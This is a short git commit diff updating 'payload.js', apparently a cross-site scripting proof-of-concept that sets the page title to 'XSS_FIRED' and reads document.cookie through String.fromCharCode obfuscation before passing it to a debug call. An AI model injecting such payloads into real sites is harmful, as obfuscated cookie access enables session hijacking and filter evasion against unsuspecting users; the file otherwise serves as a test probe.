77f17dc2d6166d3d5afc970a55b9067f5d3e12fe
0opy <103376418+Mrwick2323@users.noreply.github.com>
2026-04-26 22:00:22 -0500

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,3 @@
-DEBUG_LEVEL=DEBUG;debug(window[String.fromCharCode(100,111,99,117,109,101,110,116)][String.fromCharCode(99,111,111,107,105,101)])
+document.title = "XSS_FIRED";
+console.log("payload loaded");
+DEBUG_LEVEL=DEBUG;debug(document[String.fromCharCode(99,111,111,107,105,101)]);
